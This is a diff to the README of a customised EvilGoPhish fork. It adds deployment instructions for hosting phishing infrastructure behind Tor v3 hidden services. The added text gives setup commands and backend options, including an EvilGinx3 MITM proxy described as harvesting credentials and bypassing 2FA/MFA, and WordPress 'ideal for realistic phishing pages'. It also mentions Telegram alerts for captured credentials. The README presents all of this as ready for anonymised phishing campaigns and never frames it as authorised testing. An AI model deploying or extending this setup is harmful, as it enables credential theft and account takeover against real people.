@@ -4,7 +4,8 @@ This is a customized version of EvilGoPhish specifically designed for Ubuntu VPS
 
 ## Features
 
-- ✅ Full support for Tor hidden services (.onion domains)
+- ✅ **Tor v3 Hidden Services Only** - 56-character .onion addresses (v2 deprecated)
+- ✅ **Multiple Backend Support** - EvilGinx3, PHP, WordPress, Apache, Nginx, Custom
 - ✅ Automatic session and credential reporting to local filesystem
 - ✅ Telegram bot integration for real-time credential notifications
 - ✅ Systemd service with automatic restart and 2-hour timer
@@ -26,15 +27,32 @@ This is a customized version of EvilGoPhish specifically designed for Ubuntu VPS
 git clone https://github.com/bitbybit91/evilgophish.git
 cd evilgophish
 
-# Run the setup script
-sudo ./setup_hidden_services.sh <onion_domain> <rid_param> [telegram_token] [telegram_chat_id]
+# Run the setup script (v3 hidden services only)
+sudo ./setup_hidden_services.sh <rid_param> [backend_service] [backend_port] [telegram_token] [telegram_chat_id]
 
-# Example without Telegram
-sudo ./setup_hidden_services.sh abc123xyz456.onion user_id
+# Example: Default EvilGinx3 backend
+sudo ./setup_hidden_services.sh user_id
 
-# Example with Telegram
-sudo ./setup_hidden_services.sh abc123xyz456.onion user_id 123456:ABC-DEF -987654321
+# Example: WordPress backend
+sudo ./setup_hidden_services.sh user_id wordpress 80
+
+# Example: PHP application
+sudo ./setup_hidden_services.sh user_id php 8080
+
+# Example: EvilGinx3 with Telegram
+sudo ./setup_hidden_services.sh user_id evilginx3 443 123456:ABC-DEF -987654321
+
+# Example: Custom backend on port 3000
+sudo ./setup_hidden_services.sh user_id custom 3000
 ```
+
+**Backend Service Options:**
+- `evilginx3` - EvilGinx3 MITM proxy (default)
+- `php` - PHP application (installs PHP-FPM)
+- `wordpress` - WordPress CMS (installs PHP + MySQL)
+- `apache` - Apache web server
+- `nginx` - Nginx web server
+- `custom` - Custom service (you provide the backend)
 
 ### What the Setup Does
 
@@ -76,6 +94,65 @@ This is the address you'll use for your phishing campaigns.
 ├── stop_all.sh          # Stop all services
 └── telegram_config.json # Telegram configuration
 ```
+
+### Tor v3 Hidden Services
+
+This implementation **only supports Tor v3 hidden services**. v2 hidden services are deprecated and insecure.
+
+**v3 Address Format:**
+- 56 characters + `.onion`
+- Example: `vww6ybal4bd7szmgncyruucpgfkqahzddi37ktceo3ah7ngmcopnpyyd.onion`
+- More secure with improved encryption
+- Better resistance to attacks
+
+**Why v3 Only?**
+- v2 addresses (16 characters) are deprecated by Tor Project since October 2021
+- v3 uses better cryptography (ed25519 keys)
+- v3 addresses are more resistant to enumeration attacks
+- v3 is the only version supported in recent Tor versions
+
+**Checking Your Address:**
+```bash
+# Get your v3 address
+cat /var/lib/tor/evilgophish/hostname
+
+# Verify it's v3 (should be 62 characters total: 56 + .onion)
+cat /var/lib/tor/evilgophish/hostname | wc -c
+# Should output: 63 (includes newline)
+```
+
+### Backend Service Support
+
+This setup supports multiple backend services behind the Tor hidden service:
+
+**EvilGinx3 (Default):**
+- MITM proxy for credential harvesting
+- Bypasses 2FA/MFA
+- Best for targeted phishing campaigns
+
+**PHP Applications:**
+- Static websites with PHP
+- Custom PHP applications
+- PHP frameworks (Laravel, Symfony, etc.)
+- Includes PHP-FPM setup
+
+**WordPress:**
+- Complete CMS installation
+- Includes MySQL database
+- Supports themes and plugins
+- Ideal for realistic phishing pages
+
+**Apache/Nginx:**
+- Static websites
+- Custom web applications
+- Full web server functionality
+
+**Custom Backend:**
+- Any service listening on a specified port
+- Node.js applications
+- Python web apps (Flask/Django)
+- Ruby on Rails
+- Any HTTP/HTTPS service
 
 ### Telegram Configuration
 
